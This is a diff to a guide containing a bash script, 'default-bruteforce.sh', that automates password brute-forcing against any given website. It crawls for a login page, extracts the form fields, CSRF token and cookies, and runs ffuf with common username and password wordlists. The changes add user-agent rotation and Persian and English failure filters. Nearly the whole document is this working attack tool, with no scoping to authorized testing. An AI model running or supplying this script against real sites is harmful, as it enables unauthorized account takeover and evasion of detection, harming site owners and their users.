@@ -20,41 +20,49 @@ sudo nano default-bruteforce.sh
 ```bash
 #!/bin/bash
 
-# Check if URL is provided
-if [ $# -eq 0 ]; then
+# CONFIG
+USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+UA_LIST="/usr/share/seclists/Fuzzing/User-Agents/user-agents-whatismybrowserdotcom-mid.txt"
+FAIL_REGEX="(?i)invalid|failed|unauthorized|access denied|incorrect|wrong|try again|نام کاربری|رمز عبور|گذرواژه|اطلاعات اشتباه|ورود ناموفق"
+
+# INPUT CHECK
+if [ $# -lt 1 ]; then
     echo "Usage: $0 <domain.com>"
     exit 1
 fi
 
 URL="$1"
-USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
-PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 
-# Crawl and filter login pages
+# FIND LOGIN PAGE
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
-grep -iE "/(login|signin|my-account|account|wp-login\.php)(/)?$" | \
-grep -viE "lost-password|register|signup|\.(js|css|jpg|png|gif|svg|ico)$" | \
+grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
+grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
 sed 's:[/?]*$::' | sort -u | head -n1)
 
-# Fetch login page HTML
-HTML=$(curl -s "$LOGIN")
+if [ -z "$LOGIN" ]; then
+    echo "[!] No login page found. Exiting."
+    exit 1
+fi
 
-# Extract the first form block (up to </form>)
+# FETCH HTML
+HTML=$(curl -s "$LOGIN")
 FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 
-# Extract form action attribute (default to "/")
+# CAPTCHA / reCAPTCHA check
+CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
+if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
+    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
+    exit 1
+fi
+
+# EXTRACT FORM ACTION AND METHOD
 ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
-if [ -z "$ACTION" ]; then
-    ACTION="$LOGIN"
-fi
+[ -z "$ACTION" ] && ACTION="$LOGIN"
 
-# Extract form method (default to POST, not GET!)
 METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
-if [ -z "$METHOD" ]; then
-    METHOD="post"
-fi
+[ -z "$METHOD" ] && METHOD="post"
 
-# Construct full action URL
 if [[ "$ACTION" == /* ]]; then
     BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
     FULL_ACTION="${BASE_URL}${ACTION}"
@@ -65,30 +73,43 @@ else
     FULL_ACTION="${BASE_URL}${ACTION}"
 fi
 
-# Extract username and password field names
-USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+# EXTRACT USERNAME & PASSWORD FIELDS
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
 
-if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
-if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi
+[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
 
-# Extract CSRF token (if exists)
-CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
+# CSRF TOKEN EXTRACTION
+CSRF_FIELD=""
 CSRF_VALUE=""
-if [ -n "$CSRF_FIELD" ]; then
-    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
+
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+while read -r INPUT; do
+    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
+    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
+    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
+        CSRF_FIELD="$NAME"
+        CSRF_VALUE="$VALUE"
+        break
+    fi
+done <<< "$HIDDEN_INPUTS"
+
+if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
+    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
+    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
 fi
 
-# Prepare POST data
+# PREPARE POST DATA
 DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
-if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
-    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
-fi
+[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
-# Extract cookies
+# EXTRACT COOKIES
 COOKIES=$(curl -s -I "$LOGIN" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | tr -d '\r\n')
 
-# Headers
+# HEADERS
 HEADERS=(
   -H "Content-Type: application/x-www-form-urlencoded"
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
@@ -99,30 +120,32 @@ HEADERS=(
   -H "Upgrade-Insecure-Requests: 1"
   -H "Referer: $LOGIN"
 )
-if [ -n "$COOKIES" ]; then
-    HEADERS+=(-H "Cookie: $COOKIES")
-fi
+[ -n "$COOKIES" ] && HEADERS+=(-H "Cookie: $COOKIES")
 
-# Run ffuf with constructed parameters
+# RUN FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
+         -w "$UA_LIST:UA" \
          -X GET \
          -ac -c -r \
-         -mc 200 \
-         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
+         -mc 200,301,302 \
+         -fr "$FAIL_REGEX" \
+         -H "User-Agent: UA" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
+         -w "$UA_LIST:UA" \
          -X POST \
          -d "$DATA" \
          -ac -c -r \
-         -mc 200 \
-         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
+         -mc 200,301,302 \
+         -fr "$FAIL_REGEX" \
+         -H "User-Agent: UA" \
          "${HEADERS[@]}"
 fi
 ```
@@ -130,5 +153,5 @@ fi
 _Run Script_
 
 ```bash
-sudo chmod +x default-bruteforce;sudo ./default-bruteforce.sh $WEBSITE
+sudo chmod +x default-bruteforce.sh;sudo ./default-bruteforce.sh $WEBSITE
 ```
